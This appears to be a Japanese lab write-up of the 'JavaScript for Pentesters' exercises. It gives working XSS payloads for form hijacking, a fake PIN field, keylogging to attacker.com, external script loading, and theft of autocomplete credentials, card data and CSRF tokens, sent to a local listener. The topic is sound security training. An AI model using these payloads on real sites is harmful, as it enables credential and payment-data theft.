<!-- START doctoc generated TOC please keep comment here to allow auto update -->
<!-- DON'T EDIT THIS SECTION, INSTEAD RE-RUN doctoc TO UPDATE -->
**Table of Contents**

- [modifying HTML](#modifying-html)
  - [task 1 (Modify HTML with Javascript)](#task-1-modify-html-with-javascript)
  - [task 2 (Change All Links)](#task-2-change-all-links)
  - [task 3 (Hijack Form Submit)](#task-3-hijack-form-submit)
  - [task 4 (Modify Form Fields)](#task-4-modify-form-fields)
- [abuse XSS](#abuse-xss)
  - [task 5 (Social Engineering)](#task-5-social-engineering)
  - [task 6 (Capture All Clicks)](#task-6-capture-all-clicks)
  - [task 7 (Keystroke Logging)](#task-7-keystroke-logging)
  - [task 8 (Event Listener)](#task-8-event-listener)
  - [task 9 (Include External JS)](#task-9-include-external-js)
  - [task 10 (Include External JS using JS)](#task-10-include-external-js-using-js)
  - [task 11 (Replace Banner Image)](#task-11-replace-banner-image)
  - [task 12 (Stealing from Auto-Complete)](#task-12-stealing-from-auto-complete)
- [XMLHttpRequests](#xmlhttprequests)
  - [task 13 (Posting with XMLHttpRequest)](#task-13-posting-with-xmlhttprequest)
  - [task 14 (Fetching Data with XMLHttpRequest)](#task-14-fetching-data-with-xmlhttprequest)
  - [task 15 (Data Exfiltration with XMLHttpRequest)](#task-15-data-exfiltration-with-xmlhttprequest)
  - [task 16 (Extracting CSRF tokens)](#task-16-extracting-csrf-tokens)
  - [task 17 (CSRF Token Stealing)](#task-17-csrf-token-stealing)
- [Parsing](#parsing)
  - [task 18 (HTML Parsing of XMLHttpRequest)](#task-18-html-parsing-of-xmlhttprequest)
  - [task 19 (Multi-Level HTML Parsing)](#task-19-multi-level-html-parsing)
  - [task 20 (Mulit-Level JSON Parsing)](#task-20-mulit-level-json-parsing)
  - [task 21 (Multi-Level XML Parsing)](#task-21-multi-level-xml-parsing)
- [writeup](#writeup)

<!-- END doctoc generated TOC please keep comment here to allow auto update -->
# modifying HTML
## task 1 (Modify HTML with Javascript)
![image](https://user-images.githubusercontent.com/56021519/101612346-e2638d80-3a4d-11eb-8132-8a6e633d99cc.png)   
h2要素の3つ目と、h1要素の1つ目を書き換える。   
```js
<script>
  document.getElementsByTagName("h2")[2].innerHTML = "wetw0rk";
  document.getElementsByTagName("h1")[0].innerHTML = "ya bish";
</script>
```
## task 2 (Change All Links)
![image](https://user-images.githubusercontent.com/56021519/101612253-ca8c0980-3a4d-11eb-9290-f639f4b3e7e8.png)   
a要素のhref属性の値を4つ分書き換える。   
```js
<script>
  document.getElementsByTagName("a")[0].href = "wetw0rk";
  document.getElementsByTagName("a")[1].href = "wetw0rk";
  document.getElementsByTagName("a")[2].href = "wetw0rk";
  document.getElementsByTagName("a")[3].href = "wetw0rk";
</script>
```
## task 3 (Hijack Form Submit)
![image](https://user-images.githubusercontent.com/56021519/101612147-ad573b00-3a4d-11eb-9ae8-b4434c413766.png)   
入力した値が攻撃者に送信されるようにする。   
以下だと、actionに指定したこの攻撃者のサーバーに遷移してしまう   
今回はバレないようにしないといけないのでこれはだめ   
```js
<script>
  document.forms[0].action = "http://127.0.0.1:9000/";
  alert("XSS");
</script>
```
こんな感じでaction先に遷移してしまう。   
![image](https://user-images.githubusercontent.com/56021519/101610107-23a66e00-3a4b-11eb-8fd4-1f0463a5cd24.png)   
送信ボタンが押されるとonsubmitイベントが発火するので、そのイベントを検知したらInterceptForm()関数が呼ばれるようにする。   
`new Image().src`で画像を取得する形で攻撃サーバーに情報を送信する。  
これをURL encodeして/url?=に入れて、Javascriptが挿入された後にブラウザで送信ボタンを押す   
挿入したJavascriptはその次の送信時のブラウザで実行されるのでBurpは無意味。   
```js
<script>
function InterceptForm()
{
  var username = document.forms[0].elements[0].value;
  var password = document.forms[0].elements[1].value;
  var w;

  new Image().src = ("http://127.0.0.1:9000/?username=" +
    username + "&password=" + password);
  alert("XSS");
}

document.forms[0].onsubmit = InterceptForm;

</script>
```
```txt
tomoki@LAPTOP-KSRL4PAP:~$ python3 -m http.server 9000
Serving HTTP on 0.0.0.0 port 9000 (http://0.0.0.0:9000/) ...
127.0.0.1 - - [09/Dec/2020 17:07:05] "GET /?username=aa&password=aa HTTP/1.1" 200 -
```
## task 4 (Modify Form Fields)
![image](https://user-images.githubusercontent.com/56021519/101611938-741ecb00-3a4d-11eb-967c-97885e8eba56.png)   
formタグの2つ目のinput要素の次に、もう一つinput要素を追加する。   
`createElement`で`input`要素を作成して属性を設定し、`insertBefore`の二つ目の引数でpassのinputの一つ後ろを`nextSibling`で指定することで、そこに挿入する。   
```js
<script>
/* http://pentesteracademylab.appspot.com/lab/webapp/jfp/4 */
var nfield = document.createElement("input"); // create new input field

nfield.setAttribute("type", "text");
nfield.setAttribute("class", "input-block-level");
nfield.setAttribute("placeholder", "ATM PIN");
nfield.setAttribute("name", "pin");

var lf = document.forms[0].elements[1]; // index pass field

document.forms[0].insertBefore(nfield, lf.nextSibling); // insert after pass field
document.forms[0].action = "http://127.0.0.1/"; // send to attacking server

</script>
```
新しいフォームが追加された。   
![image](https://user-images.githubusercontent.com/56021519/101611821-5487a280-3a4d-11eb-8cd9-64a3306c8ac2.png)   
以下のようにエラーはでるが、送信はできてる。   
![image](https://user-images.githubusercontent.com/56021519/101610065-17baac00-3a4b-11eb-993e-9c5ce92ad770.png)   
以下でも同じことができる。   
```js
<script>
window.onload = function()
{
  var fieldx = document.createElement('input');
  fieldx.type = "text";
  fieldx.class = "input-block-level";
  fieldx.placeholder= "ATM PIN";
  fieldx.name = "ATM PIN";
  fieldx.style.fontSize = "16px";
  fieldx.style.height = "auto";
  fieldx.style.marginBottom = "15px";
  fieldx.style.paddingLeft = "7px";
  fieldx.style.paddingRight = "9px";
  document.forms[0].insertBefore(fieldx,document.forms[0].childNodes[6])
}
</script>
```
# abuse XSS
## task 5 (Social Engineering)
![image](https://user-images.githubusercontent.com/56021519/101613094-b09ef680-3a4e-11eb-8aba-c2338e16eb9d.png)   
formを削除して、偽のメッセージを挿入する。   
`parentNode.appendCild`で要素を挿入して、`parentNode.removeChile`でform[0]を丸々削除する。   
```js
<script>
var notice = document.createElement("h2");
notice.innerHTML = "Website is Down! Please visit SecurityTube.net";
document.forms[0].parentNode.appendChild(notice);
document.forms[0].parentNode.removeChild(document.forms[0]);
</script>
```
![image](https://user-images.githubusercontent.com/56021519/101616581-de863a00-3a52-11eb-976f-af4b37cb4a88.png)   

## task 6 (Capture All Clicks)
![image](https://user-images.githubusercontent.com/56021519/101616919-4dfc2980-3a53-11eb-8e7c-e7945c06813e.png)   
画面上をクリックしたら遷移する。   
```js
<script>
document.body.onclick = function(){
  window.location.href = "http://127.0.0.1:9000/";
};
</script>

<script>
window.onclick = function(){
  window.location.href = "http://127.0.0.1:9000/";
};
</script>

<script>
  /* http://pentesteracademylab.appspot.com/lab/webapp/jfp/6 */
  function gotClick() {
    location.href = "https://google.com";
  }

  document.body.addEventListener('click', gotClick, true);
</script>
```
## task 7 (Keystroke Logging)
![image](https://user-images.githubusercontent.com/56021519/101618138-e646de00-3a54-11eb-921e-de26fa08336a.png)   
keyboard入力イベントが発生すると攻撃者サーバーにそのキー入力を送信する。   
```js
<script>
document.addEventListener("keypress",(event)=>{
    var keyname = event.key;
    new Image().src = "http://localhost:9000?key=" + keyname;
});
</script>
```
```txt
127.0.0.1 - - [09/Dec/2020 20:18:15] "GET /?key=a HTTP/1.1" 200 -
127.0.0.1 - - [09/Dec/2020 20:18:23] "GET /?key=b HTTP/1.1" 200 -
127.0.0.1 - - [09/Dec/2020 20:18:23] "GET /?key=c HTTP/1.1" 200 -
127.0.0.1 - - [09/Dec/2020 20:18:24] "GET /?key=d HTTP/1.1" 200 -
127.0.0.1 - - [09/Dec/2020 20:18:24] "GET /?key=e HTTP/1.1" 200 -
```
以下でも可能らしい.   
```js
<script>
document.onpress = function KeyLogger(inp)
{
  key_pressed = String.fromCharCode(inp.which);
  new Image().src = "http://attacker.com/?" + key_pressed;
}
</script>
```
## task 8 (Event Listener)
![image](https://user-images.githubusercontent.com/56021519/101623917-7dfbfa80-3a5c-11eb-8870-18c1dd371ae0.png)   
送信ボタンが押されたらパスワードを`alert()`で表示させる。   
`?url=a`とか入力してもaが表示されないのでおそらくこの問題だけバグっててXSSできないようになってる？？   
以下で動くらしい。   
```js
<script>
  // http://pentesteracademylab.appspot.com/lab/webapp/jfp/8
  document.forms[0].onsubmit = function demo() {
    var pass = document.forms[0].elements[1].value;
    alert(pass);
  }

</script>
```
## task 9 (Include External JS)
![image](https://user-images.githubusercontent.com/56021519/101625482-cf0cee00-3a5e-11eb-915f-ec4994ae1e9b.png)   
外部のファイルを読み込んでCookieをalertで表示。   
```js
<script type="text/javascript" src="http://127.0.0.1:9000/task9.js"></script>
```
```txt
alert(document.cookie);
```
![image](https://user-images.githubusercontent.com/56021519/101626007-a33e3800-3a5f-11eb-92fb-da8011d0b19c.png)   
## task 10 (Include External JS using JS)
![image](https://user-images.githubusercontent.com/56021519/101626732-bbfb1d80-3a60-11eb-8880-feec4e120507.png)   
外部のファイルを読み込んで実行。ただし`?url=`以降は`<script>   </script>`内に挿入される。   
```js
var script = document.createElement('script');
script.src = "http://demofilespa.s3.amazonaws.com/jfptest.js"; 
document.head.appendChild(script); 
```
![image](https://user-images.githubusercontent.com/56021519/101626671-a2f26c80-3a60-11eb-8c17-35fa083623fb.png)   
## task 11 (Replace Banner Image)
![image](https://user-images.githubusercontent.com/56021519/101627034-1a280080-3a61-11eb-82e5-e5d57be05992.png)   
上のBanner画像を別の画像に差し替える。   
```js
<script>
document.getElementsByTagName("img")[0].src = "http://127.0.0.1:9000/";
</script>
```
![image](https://user-images.githubusercontent.com/56021519/101627508-cbc73180-3a61-11eb-9959-d3a724de8cdc.png)   

## task 12 (Stealing from Auto-Complete)
![image](https://user-images.githubusercontent.com/56021519/101627659-04ffa180-3a62-11eb-950f-8eae7a3d4f7c.png)   
remember meボタンで入力を保存した状態で、JSが10秒後にフォームを送信するXSSを注入すれば、送信ボタンを押してなくても送信できる。    
攻撃のタイミングをずらせるってこと？   
```js
<script>
window.setTimeout(function(){
  document.forms[0].action = "http:localhost:9000";
  document.forms[0].submit();
},10000)
</script>
```
```txt
127.0.0.1 - - [09/Dec/2020 21:14:00] "GET /?email=vvv&password=bbb&DoesThisMatter=remember-me HTTP/1.1" 200 -
```
![image](https://user-images.githubusercontent.com/56021519/101628709-8c014980-3a63-11eb-8df3-d2512c71d24d.png)   

# XMLHttpRequests
## task 13 (Posting with XMLHttpRequest)
![image](https://user-images.githubusercontent.com/56021519/101629078-1d70bb80-3a64-11eb-9445-d962e7abd9e1.png)   
task12と同じことをするが、XMLHttpRequest()を使う。   
```js
<script>
window.setTimeout(function(){
  var xhr = new XMLHttpRequest();
  xhr.open("GET", "http://localhost:9000/" +document.forms[0].elements[1].value );
  xhr.send();
},10000)
</script>
```
```txt
127.0.0.1 - - [09/Dec/2020 21:28:55] "GET /b HTTP/1.1" 404 -
```
## task 14 (Fetching Data with XMLHttpRequest)
![image](https://user-images.githubusercontent.com/56021519/101633147-35e3d480-3a6a-11eb-808d-81ca0508093c.png)   
XMLHttpRequest()で受信したデータを表示させる。   
```js
<script>
  var xhr = new XMLHttpRequest();
  xhr.onreadystatechange = function(){
      if(xhr.readyState == 4 && xhr.status == 200){
          var div = document.createElement("div");
          div.id = "result";
          div.innerHTML = (xhr.responseText);
          document.getElementsByTagName("h2")[0].appendChild(div);
      }
  }
  xhr.open("GET", "http://pentesteracademylab.appspot.com/lab/webapp/jfp/14/email?name=john");
  xhr.send();
</script>
```
![image](https://user-images.githubusercontent.com/56021519/101635466-5c573f00-3a6d-11eb-9bb0-a4f6bcca8ed4.png)   

## task 15 (Data Exfiltration with XMLHttpRequest)
![image](https://user-images.githubusercontent.com/56021519/101635776-c1ab3000-3a6d-11eb-8a5d-acd138aba79d.png)   
XMLHttpRequestで受信したデータを攻撃者に送信する。   
```js
<script>
  var xhr = new XMLHttpRequest();
  xhr.onreadystatechange = function(){
      if(xhr.readyState == 4 && xhr.status == 200){
          new Image().src = ("http://127.0.0.1:9000/?" + xhr.responseText);
      }
  }
  xhr.open("POST", "http://pentesteracademylab.appspot.com/lab/webapp/jfp/15/cardstore?user=john",true);
  xhr.send();
</script>
```
```txt
127.0.0.1 - - [09/Dec/2020 22:45:08] "GET /?1111-2222-3333-4444 HTTP/1.1" 200 -
```
## task 16 (Extracting CSRF tokens)
![image](https://user-images.githubusercontent.com/56021519/101637815-95dd7980-3a70-11eb-83c2-a9faa1185617.png)   
csrf_tokenをハードコーディングせずに動的に取得してそれをXMLHttpRequestで送信して結果を表示する。   
```js
<script>
function getParam(name, url) {
    if (!url) url = window.location.href;
    name = name.replace(/[\[\]]/g, "\\$&");
    var regex = new RegExp("[?&]" + name + "(=([^&#]*)|&|#|$)"),
        results = regex.exec(url);
    if (!results) return null;
    if (!results[2]) return '';
    return decodeURIComponent(results[2].replace(/\+/g, " "));
}
var result = getParam("csrf_token");
alert(result);

var xhr = new XMLHttpRequest();
xhr.onreadystatechange = function(){
    if(xhr.readyState == 4 && xhr.status == 200){
        document.getElementById("result").innerHTML = xhr.responseText;
    }
}
xhr.open("GET", "http://pentesteracademylab.appspot.com/lab/webapp/jfp/16/email?name=john&csrf_token=" + result,true);
xhr.send();
</script>
```
以下でも行けるっぽい。こっちの方がシンプルでよさそうだけど、`csrf_token`って指定するのは無理。   
```js
<script>
  /* http://pentesteracademylab.appspot.com/lab/webapp/jfp/16?url=www&csrf_token=87756351612121977981321312312123123126554427773 */
  var req = new XMLHttpRequest();
  req.onreadystatechange = function() {
    if (req.readyState == 4 && req.status == 200) {
      document.getElementById("result").innerHTML=req.responseText;
    }
  }
  var token = window.location.search.split('&')[1];
  req.open("GET", "/lab/webapp/jfp/16/email?name=john&" + token, true);
  req.send();
</script>
```
![image](https://user-images.githubusercontent.com/56021519/101788728-c8a47200-3b43-11eb-9cf2-9851cce07266.png)   

## task 17 (CSRF Token Stealing)
![image](https://user-images.githubusercontent.com/56021519/101789238-6304b580-3b44-11eb-8c13-4053025b9cc8.png)   
htmlに埋め込まれたUIDとCSRF_TOKENを動的に取得してXMLHttpRequestで送信して受信したデータを表示する。   
```js
<script>
var uid = document.getElementById("uid").innerHTML.split(":")[1];
var csrf = document.getElementById("csrf").innerHTML.split(":")[1];

var xhr = new XMLHttpRequest();
xhr.onreadystatechange = function(){
    if(xhr.readyState == 4 && xhr.status == 200){
        document.getElementById("result").innerHTML = xhr.responseText;
    }
}
xhr.open("GET", "http://pentesteracademylab.appspot.com/lab/webapp/jfp/17/email?uid=" +uid+ "&csrf_token=" + csrf,true);
xhr.send();
</script>
```
![image](https://user-images.githubusercontent.com/56021519/101790611-01454b00-3b46-11eb-9a8c-6db843b58916.png)   

# Parsing
## task 18 (HTML Parsing of XMLHttpRequest)
![image](https://user-images.githubusercontent.com/56021519/101790898-4bc6c780-3b46-11eb-9bdf-805c9a602896.png)   
XMLHttpRequestでHTML Documentを受信してDOMを解析してデータを表示する。   
responseTypeを`document`に、responseTextじゃなくて`responseXML`を使用しないとダメ。   
```js
<script>
var xhr = new XMLHttpRequest();
xhr.onreadystatechange = function(){
    if(xhr.readyState == 4 && xhr.status == 200){
        var result = xhr.responseXML;
        alert(result);
        document.getElementById("result").innerHTML = result.getElementById("address").innerHTML;
    }
}
xhr.open("GET", "http://pentesteracademylab.appspot.com/lab/webapp/jfp/18/address",true);
xhr.responseType = "document";
xhr.send();
</script>
```
![image](https://user-images.githubusercontent.com/56021519/101792464-158a4780-3b48-11eb-90ac-9e47980a989c.png)   

## task 19 (Multi-Level HTML Parsing)
![image](https://user-images.githubusercontent.com/56021519/101792810-7ade3880-3b48-11eb-9f54-a2bb8b8c9c18.png)   
XMLHttpRequestでHTML Documentを受信してDOMを解析してデータを得る。   
そのデータを使ってさらにXMLHttpRequestで送信してデータを受信して解析して表示する。   
XMLHttpRequestの二重に使う。   
ゲットするCSRF_TOKENの場所ミスってたせいで`Invalid Session`になってしまって二段階目のXMLHttpRequestでほぼ何もHTML Documentが返ってこなくて時間つぶした…   
```js
<script>
var url = document.getElementById("settings").href;
var uid = document.getElementById("settings").innerHTML.split(":")[1];
var csrf = "";

var xhr = new XMLHttpRequest();
var xhr2 = new XMLHttpRequest();
var url_second = "";

xhr2.onreadystatechange = function(){
  if(xhr2.readyState == 4 && xhr2.status == 200){
      var html2 = xhr2.responseXML;
      var credit = html2.getElementById("result").innerHTML;
      document.getElementById("result").innerHTML = credit;
      new Image().src = "http://127.0.0.1:9000/?=" + credit;
      alert(credit);
  }
}
xhr.onreadystatechange = function(){
    if(xhr.readyState == 4 && xhr.status == 200){
        var result = xhr.responseXML;
        var form_action = result.forms[0].action;
        csrf = result.forms[0].elements[1].value;
        
        url_second = form_action + "?uid=" + uid + "&csrf_token=" + csrf;
        alert(url_second);
        xhr2.open("GET",url_second,true);
        xhr2.responseType = "document";
        xhr2.send();
    }
}
xhr.open("GET",url ,true);
xhr.responseType = "document";
xhr.send();
</script>
```
![image](https://user-images.githubusercontent.com/56021519/101802286-99493180-3b52-11eb-99a9-f13441dd96c8.png)   
## task 20 (Mulit-Level JSON Parsing)
![image](https://user-images.githubusercontent.com/56021519/101802730-1ecce180-3b53-11eb-9b96-514faddd7ae1.png)   
XMLHttpRequestでJSONを受信してJSON.parseでJSONを解析してデータを得る。   
そのデータを使ってさらにXMLHttpRequestで送信してデータを受信して解析して表示する。   
XMLHttpRequestの二重に使う。   
```js
<script>
var url1 = "/lab/webapp/jfp/20/gettoken?uid=";
var url2 = "/lab/webapp/jfp/20/getpassword?token=";

var uid = document.getElementById("settings").innerHTML.split(":")[1];
var token = "";
var password = "";

var xhr = new XMLHttpRequest();
var xhr2 = new XMLHttpRequest();

xhr2.onreadystatechange = function(){
  if(xhr2.readyState == 4 && xhr2.status == 200){
      // {"resp": {"token": "23232hg827j2gfj22kg2", "ref": 23232, "password": "123456"}, "uid": 3476, "name": "John"}
      var data2 = JSON.parse(xhr2.responseText);
      password = data2.resp.password;
      document.getElementById("result").innerHTML = password;
      alert(password);
  }
}
xhr.onreadystatechange = function(){
    if(xhr.readyState == 4 && xhr.status == 200){
        // {"params": {"token": "23232hg827j2gfj22kg2", "ref": 23232}, "uid": 3476, "name": "John"}
        var data1 = JSON.parse(xhr.responseText);
        alert(xhr.responseText); 
        token = data1.params.token;
        alert(token);
        
        xhr2.open("GET",url2 + token,true);
        xhr2.send();
    }
}
alert(uid);
xhr.open("GET",url1 + uid ,true);
xhr.send();
</script>
```
![image](https://user-images.githubusercontent.com/56021519/101805076-aa477200-3b55-11eb-8d32-19b4f7f9bd4b.png)   

## task 21 (Multi-Level XML Parsing)
![image](https://user-images.githubusercontent.com/56021519/101805380-090ceb80-3b56-11eb-8dc9-23240208d1c9.png)   
JSONじゃなくてXMLを解析する。   
```js
<script>
var url = document.getElementById("settings").href;
var uid = "";
var token = "";
var endpoint = "";

var xhr = new XMLHttpRequest();
var xhr2 = new XMLHttpRequest();

xhr2.onreadystatechange = function(){
  if(xhr2.readyState == 4 && xhr2.status == 200){
      alert(xhr2.responseText);
      document.getElementById("result").innerHTML = xhr2.responseText;
  }
}

xhr.onreadystatechange = function(){
    if(xhr.readyState == 4 && xhr.status == 200){
        var xml = xhr.responseXML;
        alert(xml);
        uid = xml.getElementsByTagName("uid-param-value")[0].textContent;
        token = xml.getElementsByTagName("token-param-value")[0].textContent;
        endpoint = xml.getElementsByTagName("endpoint")[0].textContent;

        var url2 = endpoint + "?uid=" + uid + "&token=" + token;
        alert(url2);
        xhr2.open("GET",url2,true);
        xhr2.send();
    }
}
alert(url);
xhr.open("GET",url,true);
xhr.send();
</script>
```
解析するのは以下のXML   
```xml
<apiendpoints>
<id>Challenge 21</id>
<endpoint>/lab/webapp/jfp/21/questions</endpoint>
<params id="uid">
<uid-param-description>User Id of the user</uid-param-description>
<uid-param-value>3423</uid-param-value>
</params>
<params id="token">
<token-param-description>CSRF Token</token-param-description>
<token-param-value>17365130891738216321</token-param-value>
</params>
</apiendpoints>
```
![image](https://user-images.githubusercontent.com/56021519/101809465-edf0aa80-3b5a-11eb-80d6-237c6e7ccf3c.png)   

# writeup
https://github.com/wetw0rk/AWAE-PREP/blob/master/JavaScript%20For%20Pentesters/README.md   
https://github.com/bupt007/pentester-for-javascript-/blob/master/solution.js   
